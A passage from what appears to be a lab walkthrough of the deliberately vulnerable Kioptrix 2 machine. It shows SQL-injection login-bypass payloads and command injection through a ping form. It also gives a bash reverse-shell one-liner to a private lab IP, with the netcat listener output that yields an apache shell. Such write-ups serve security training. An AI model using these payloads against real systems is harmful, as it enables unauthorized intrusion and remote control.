That's a lot of attack surface to cover. Let's start with the web application on port 80.

Looks like a login page for administrators. We can try `sql` injection or `sql` login bypass.  
We can bypass the login using `' or 1#` or `' or 1-- `

#### MySQL Login code (an be found after getting a shell)
```sql
$query = "SELECT * FROM users WHERE username = '$username' AND password='$password'";
```
We can see that we can escape from the query using a `'` and then return a true value using `or 1` and then comment out the rest using `#` or `-- `

## Low Privilege Shell
Login has been successfully bypassed and we are presented with another page, asking for an ip address to ping.  
We can inject any command here by appending a `;` followed by our code.  
Unfortunately there was no `netcat` installed. But we can get reverse shell using `bash`

```bash
bash -i >& /dev/tcp/192.168.71.128/4444 0>&1
```
Don't forget to start a `nc` listener.

```bash
root@kali:~/Desktop/vulnhub/kioptix2# nc -lvp 4444
listening on [any] 4444 ...
192.168.71.129: inverse host lookup failed: Unknown host
connect to [192.168.71.128] from (UNKNOWN) [192.168.71.129] 49917
bash: no job control in this shell
bash-3.00$ id
uid=48(apache) gid=48(apache) groups=48(apache)
```
And we have a shell.
